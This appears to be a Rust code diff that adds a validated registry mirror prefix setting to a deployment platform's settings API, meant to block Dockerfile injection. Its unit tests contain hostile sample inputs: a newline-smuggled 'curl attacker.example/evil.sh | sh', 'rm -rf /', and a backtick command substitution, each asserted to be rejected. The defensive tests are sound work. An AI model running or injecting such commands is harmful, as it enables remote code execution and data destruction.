@@ -156,6 +156,11 @@ pub struct AppSettingsResponse {
     // Docker registry settings with masked password
     pub docker_registry: DockerRegistrySettingsMasked,
 
+    /// Prefix applied to implicit Docker Hub base images in generated
+    /// Dockerfiles (e.g. autopack's `FROM node:22-slim`). No sensitive
+    /// content, passed through as-is. `None`/empty disables rewriting.
+    pub registry_mirror_prefix: Option<String>,
+
     // Monitoring settings
     pub disk_space_alert: DiskSpaceAlertSettings,
 
@@ -398,6 +403,7 @@ impl From<AppSettings> for AppSettingsResponse {
                 tls_verify: settings.docker_registry.tls_verify,
                 ca_certificate: settings.docker_registry.ca_certificate,
             },
+            registry_mirror_prefix: settings.registry_mirror_prefix,
             disk_space_alert: settings.disk_space_alert,
             container_logs: settings.container_logs,
             agent_sandbox: AgentSandboxSettingsMasked {
@@ -1508,6 +1514,40 @@ fn sanitize_optional_url(
     Ok(Some(trimmed))
 }
 
+/// Trim and validate `registry_mirror_prefix`, rejecting anything outside a
+/// registry host+path's character set (alphanumerics, `.`, `-`, `_`, `:`,
+/// `/`).
+///
+/// This is the write-time half of the injection defense: `qualify_with_registry_prefix`
+/// (`temps-core::registry_prefix`) already refuses to splice a malformed
+/// prefix into a Dockerfile at build time, but rejecting here means an
+/// operator gets an immediate 400 explaining why, instead of the prefix
+/// silently never applying to any build. Reuses `temps_core`'s allowlist
+/// rather than re-deriving it, so the write-time check and the build-time
+/// check can never drift apart.
+fn sanitize_registry_mirror_prefix(prefix: Option<String>) -> Result<Option<String>, Problem> {
+    let Some(raw) = prefix else {
+        return Ok(None);
+    };
+
+    let trimmed = raw.trim().trim_end_matches('/').to_string();
+    if trimmed.is_empty() {
+        return Ok(None);
+    }
+
+    if !temps_core::registry_prefix::is_valid_registry_prefix(&trimmed) {
+        return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
+            .title("Invalid Registry Mirror Prefix")
+            .detail(
+                "registry_mirror_prefix may only contain letters, digits, '.', '-', '_', ':' and '/'"
+                    .to_string(),
+            )
+            .build());
+    }
+
+    Ok(Some(trimmed))
+}
+
 fn validate_observability_compression(
     compression: &ObservabilityCompressionSettings,
 ) -> Result<(), Problem> {
@@ -1856,6 +1896,8 @@ async fn update_settings(
 
     settings.external_url = sanitize_optional_url("External", settings.external_url)?;
     settings.internal_url = sanitize_optional_url("Internal", settings.internal_url)?;
+    settings.registry_mirror_prefix =
+        sanitize_registry_mirror_prefix(settings.registry_mirror_prefix)?;
     // Validate and sanitize external_url
     if let Some(ref mut ext_url) = settings.external_url {
         *ext_url = ext_url.trim().to_string();
@@ -2447,6 +2489,65 @@ mod tests {
         assert!(
             sanitize_optional_url("External", Some("https://example.com#frag".to_string()))
                 .is_err()
+        );
+    }
+
+    #[test]
+    fn sanitize_registry_mirror_prefix_treats_blank_as_unset() {
+        assert_eq!(
+            sanitize_registry_mirror_prefix(Some(String::new())).unwrap(),
+            None
+        );
+        assert_eq!(
+            sanitize_registry_mirror_prefix(Some("   ".to_string())).unwrap(),
+            None
+        );
+        assert_eq!(sanitize_registry_mirror_prefix(None).unwrap(), None);
+    }
+
+    #[test]
+    fn sanitize_registry_mirror_prefix_trims_whitespace_and_trailing_slash() {
+        assert_eq!(
+            sanitize_registry_mirror_prefix(Some("  registry.example.com/docker/ \n".to_string()))
+                .unwrap(),
+            Some("registry.example.com/docker".to_string())
+        );
+    }
+
+    // Regression: the settings API is the boundary where an operator-supplied
+    // prefix must be rejected outright, not silently defused later. Without
+    // this, a prefix containing an embedded newline would be accepted and
+    // stored, and only fail to apply (silently) once a build actually ran.
+    #[test]
+    fn sanitize_registry_mirror_prefix_rejects_embedded_control_characters() {
+        let err = sanitize_registry_mirror_prefix(Some(
+            "registry.example.com\nRUN curl attacker.example/evil.sh | sh".to_string(),
+        ))
+        .unwrap_err();
+        let detail = err.body.get("detail").and_then(|v| v.as_str()).unwrap();
+        assert!(detail.contains("registry_mirror_prefix"));
+    }
+
+    #[test]
+    fn sanitize_registry_mirror_prefix_rejects_shell_metacharacters() {
+        assert!(sanitize_registry_mirror_prefix(Some(
+            "registry.example.com; rm -rf /".to_string()
+        ))
+        .is_err());
+        assert!(
+            sanitize_registry_mirror_prefix(Some("registry.example.com`whoami`".to_string()))
+                .is_err()
+        );
+    }
+
+    #[test]
+    fn sanitize_registry_mirror_prefix_accepts_a_well_formed_prefix() {
+        assert_eq!(
+            sanitize_registry_mirror_prefix(Some(
+                "registry.example.com:5000/team_a/docker-mirror".to_string()
+            ))
+            .unwrap(),
+            Some("registry.example.com:5000/team_a/docker-mirror".to_string())
         );
     }
 
